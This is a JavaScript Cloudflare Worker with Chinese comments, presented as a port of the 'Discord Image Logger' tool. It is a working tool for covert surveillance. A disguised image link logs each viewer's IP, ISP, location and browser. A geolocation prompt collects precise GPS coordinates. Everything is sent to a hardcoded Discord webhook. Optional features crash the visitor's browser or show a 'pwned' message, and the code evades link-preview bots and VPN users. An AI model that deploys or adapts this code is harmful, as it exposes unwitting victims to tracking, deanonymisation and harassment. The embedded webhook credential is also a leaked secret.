// Discord Image Logger - Cloudflare Workers 版本
// 原 Python 项目由 DeKrypt 开发
// 转换为 Cloudflare Workers JavaScript

// ============ 配置区域 ============
const config = {
  // Discord Webhook URL（请替换成你自己的）
  webhook: "https://discord.com/api/webhooks/1510603565297827992/SzSd843_34QGLNF7rEpsrGVRmWj_53dZDJCuPJ-32gqyPhwSMOj39oziy2jkqTbLa-Zl",
  
  // 默认图片 URL（当没有提供 url 参数时使用）
  defaultImage: "https://i.im.ge/QMhvl8C/Screenshot_20260509-180121.png",
  
  // 是否允许通过 url 参数自定义图片
  imageArgument: true,
  
  // Webhook 用户名
  username: "Image Logger",
  
  // 嵌入颜色（十六进制）
  color: 0x00FFFF,
  
  // 黑名单 IP 前缀（这些 IP 不会被记录）
  blacklistedIPs: ["178"],
  
  // VPN 检查级别
  // 0 = 无防 VPN
  // 1 = VPN 时不 @everyone
  // 2 = VPN 时不发送警报
  vpnCheck: 1,
  
  // 反机器人级别
  // 0 = 无防机器人
  // 1 = 可能是机器人时不 @everyone
  // 2 = 100% 机器人时不 @everyone
  // 3 = 可能是机器人时不发送
  // 4 = 100% 机器人时不发送
  antiBot: 1,
  
  // 精确位置（GPS）
  accurateLocation: true,
  
  // 浏览器崩溃功能
  crashBrowser: false,
  
  // 链接发送提醒
  linkAlerts: true,
  
  // 自定义消息
  message: {
    doMessage: false,
    message: "This browser has been pwned by Image Logger",
    richMessage: true
  },
  
  // 重定向设置
  redirect: {
    redirect: false,
    page: "https://example.com"
  },
  
  // 是否显示加载图片（Discord 预览）
  buggedImage: true
};

// 1x1 透明 GIF 的 Base64
const TRANSPARENT_GIF = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

// ============ 辅助函数 ============

// 检查是否为 Discord 爬虫
function isDiscordBot(ip, userAgent) {
  if (ip && (ip.startsWith("34") || ip.startsWith("35"))) {
    return "Discord";
  }
  if (userAgent && userAgent.startsWith("TelegramBot")) {
    return "Telegram";
  }
  return false;
}

// 解析 User-Agent
function parseUserAgent(ua) {
  const uaLower = ua.toLowerCase();
  
  let browser = "Unknown";
  if (uaLower.includes("chrome") && !uaLower.includes("edg")) browser = "Chrome";
  else if (uaLower.includes("firefox")) browser = "Firefox";
  else if (uaLower.includes("safari") && !uaLower.includes("chrome")) browser = "Safari";
  else if (uaLower.includes("edg")) browser = "Edge";
  else if (uaLower.includes("opera")) browser = "Opera";
  
  let os = "Unknown";
  if (uaLower.includes("windows")) os = "Windows";
  else if (uaLower.includes("mac")) os = "macOS";
  else if (uaLower.includes("linux")) os = "Linux";
  else if (uaLower.includes("android")) os = "Android";
  else if (uaLower.includes("iphone") || uaLower.includes("ipad")) os = "iOS";
  
  return { browser, os };
}

// 获取 IP 详细信息
async function getIPInfo(ip) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=16976857`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("获取 IP 信息失败:", error);
    return {
      isp: "Unknown",
      as: "Unknown",
      country: "Unknown",
      regionName: "Unknown",
      city: "Unknown",
      lat: 0,
      lon: 0,
      timezone: "Unknown/Unknown",
      mobile: false,
      proxy: false,
      hosting: false
    };
  }
}

// 检查是否应该跳过记录
function shouldSkipLog(ip, ipInfo) {
  // 检查黑名单
  for (const prefix of config.blacklistedIPs) {
    if (ip && ip.startsWith(prefix)) {
      return true;
    }
  }
  
  // VPN 检查
  if (ipInfo.proxy) {
    if (config.vpnCheck === 2) return true;
  }
  
  // 反机器人检查
  if (ipInfo.hosting && !ipInfo.proxy) {
    if (config.antiBot === 4) return true;
    if (config.antiBot === 3) return true;
  }
  
  return false;
}

// 发送到 Discord Webhook
async function sendToDiscord(ip, userAgent, ipInfo, endpoint, imageUrl, preciseLocation = null) {
  const bot = isDiscordBot(ip, userAgent);
  
  if (bot) {
    // 是 Discord/Telegram 爬虫，只发送链接提醒
    if (config.linkAlerts) {
      await fetch(config.webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: config.username,
          embeds: [{
            title: "Image Logger - Link Sent",
            color: config.color,
            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${endpoint}\`\n**IP:** \`${ip}\`\n**Platform:** \`${bot}\``
          }]
        })
      });
    }
    return;
  }
  
  // 决定是否 @everyone
  let ping = "@everyone";
  if (ipInfo.proxy && config.vpnCheck === 1) ping = "";
  if (ipInfo.hosting && !ipInfo.proxy && config.antiBot === 2) ping = "";
  if (config.antiBot === 1) ping = "";
  
  // 解析 User-Agent
  const { os, browser } = parseUserAgent(userAgent);
  
  // 构建位置信息
  const coords = preciseLocation || `${ipInfo.lat}, ${ipInfo.lon}`;
  const coordStr = preciseLocation ? coords.replace(",", ", ") : `${ipInfo.lat}, ${ipInfo.lon}`;
  
  // 构建 Embed
  const embed = {
    username: config.username,
    content: ping,
    embeds: [{
      title: "Image Logger - IP Logged",
      color: config.color,
      description: `**A User Opened the Original Image!**\n\n` +
        `**Endpoint:** \`${endpoint}\`\n\n` +
        `**IP Info:**\n` +
        `> **IP:** \`${ip || 'Unknown'}\`\n` +
        `> **Provider:** \`${ipInfo.isp || 'Unknown'}\`\n` +
        `> **ASN:** \`${ipInfo.as || 'Unknown'}\`\n` +
        `> **Country:** \`${ipInfo.country || 'Unknown'}\`\n` +
        `> **Region:** \`${ipInfo.regionName || 'Unknown'}\`\n` +
        `> **City:** \`${ipInfo.city || 'Unknown'}\`\n` +
        `> **Coords:** \`${coordStr}\` (${preciseLocation ? 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + preciseLocation + ')' : 'Approximate'})\n` +
        `> **Timezone:** \`${ipInfo.timezone ? ipInfo.timezone.split('/')[1]?.replace('_', ' ') + ' (' + ipInfo.timezone.split('/')[0] + ')' : 'Unknown'}\`\n` +
        `> **Mobile:** \`${ipInfo.mobile || false}\`\n` +
        `> **VPN:** \`${ipInfo.proxy || false}\`\n` +
        `> **Bot:** \`${ipInfo.hosting && !ipInfo.proxy ? 'True' : (ipInfo.hosting ? 'Possibly' : 'False')}\`\n\n` +
        `**PC Info:**\n` +
        `> **OS:** \`${os}\`\n` +
        `> **Browser:** \`${browser}\`\n\n` +
        `**User Agent:**\n` +
        `\`\`\`\n${userAgent}\n\`\`\``
    }]
  };
  
  if (imageUrl) {
    embed.embeds[0].thumbnail = { url: imageUrl };
  }
  
  await fetch(config.webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(embed)
  });
}

// 生成 HTML 响应
function generateHTML(imageUrl, preciseLocation = false, customMessage = null) {
  let html = `<style>body{margin:0;padding:0;}div.img{background-image:url('${imageUrl}');background-position:center center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}</style><div class="img"></div>`;
  
  if (customMessage && config.message.doMessage) {
    html = customMessage;
  }
  
  if (preciseLocation) {
    html += `<script>
      var currenturl = window.location.href;
      if (!currenturl.includes("g=")) {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function (coords) {
            var gps = btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
            currenturl += (currenturl.includes("?") ? "&g=" : "?g=") + gps;
            location.replace(currenturl);
          });
        }
      }
    </script>`;
  }
  
  return html;
}

// ============ 主 Worker 处理函数 ============

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const userAgent = request.headers.get("User-Agent") || "Unknown";
    const ip = request.headers.get("CF-Connecting-IP") || 
               request.headers.get("X-Forwarded-For")?.split(",")[0] || 
               "Unknown";
    
    // 获取图片 URL
    let imageUrl = config.defaultImage;
    if (config.imageArgument) {
      const urlParam = url.searchParams.get("url");
      const idParam = url.searchParams.get("id");
      if (urlParam) {
        try {
          imageUrl = atob(urlParam);
        } catch(e) {}
      } else if (idParam) {
        try {
          imageUrl = atob(idParam);
        } catch(e) {}
      }
    }
    
    // 检查是否为 Discord 爬虫
    const bot = isDiscordBot(ip, userAgent);
    
    // 如果是爬虫且启用 buggedImage，返回加载图片
    if (bot && config.buggedImage) {
      const gifBuffer = new Uint8Array([...Buffer.from(TRANSPARENT_GIF, "base64")]);
      
      // 异步发送报告
      ctx.waitUntil((async () => {
        const ipInfo = await getIPInfo(ip);
        await sendToDiscord(ip, userAgent, ipInfo, url.pathname, imageUrl);
      })());
      
      return new Response(gifBuffer, {
        headers: {
          "Content-Type": "image/gif",
          "Cache-Control": "no-cache"
        }
      });
    }
    
    // 正常用户访问
    // 获取精确位置（如果有 g 参数）
    let preciseLocation = null;
    const gpsParam = url.searchParams.get("g");
    if (gpsParam && config.accurateLocation) {
      try {
        preciseLocation = atob(gpsParam);
      } catch(e) {}
    }
    
    // 获取 IP 信息并发送报告（异步）
    ctx.waitUntil((async () => {
      const ipInfo = await getIPInfo(ip);
      const shouldSkip = shouldSkipLog(ip, ipInfo);
      if (!shouldSkip) {
        await sendToDiscord(ip, userAgent, ipInfo, url.pathname, imageUrl, preciseLocation);
      }
    })());
    
    // 生成响应内容
    let html = generateHTML(imageUrl, config.accurateLocation && !preciseLocation, null);
    
    // 处理自定义消息
    if (config.message.doMessage) {
      let message = config.message.message;
      if (config.message.richMessage) {
        const ipInfo = await getIPInfo(ip);
        const { os, browser } = parseUserAgent(userAgent);
        message = message
          .replace("{ip}", ip)
          .replace("{isp}", ipInfo.isp || "Unknown")
          .replace("{asn}", ipInfo.as || "Unknown")
          .replace("{country}", ipInfo.country || "Unknown")
          .replace("{region}", ipInfo.regionName || "Unknown")
          .replace("{city}", ipInfo.city || "Unknown")
          .replace("{lat}", String(ipInfo.lat))
          .replace("{long}", String(ipInfo.lon))
          .replace("{timezone}", ipInfo.timezone ? ipInfo.timezone.split('/')[1]?.replace('_', ' ') : "Unknown")
          .replace("{mobile}", String(ipInfo.mobile))
          .replace("{vpn}", String(ipInfo.proxy))
          .replace("{bot}", String(ipInfo.hosting))
          .replace("{browser}", browser)
          .replace("{os}", os);
      }
      html = message;
    }
    
    // 处理浏览器崩溃（大量循环）
    if (config.crashBrowser) {
      html += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>';
    }
    
    // 处理重定向
    if (config.redirect.redirect) {
      html = `<meta http-equiv="refresh" content="0;url=${config.redirect.page}">`;
    }
    
    return new Response(html, {
      headers: {
        "Content-Type": "text/html",
        "Cache-Control": "no-cache, no-store, must-revalidate"
      }
    });
  }
};
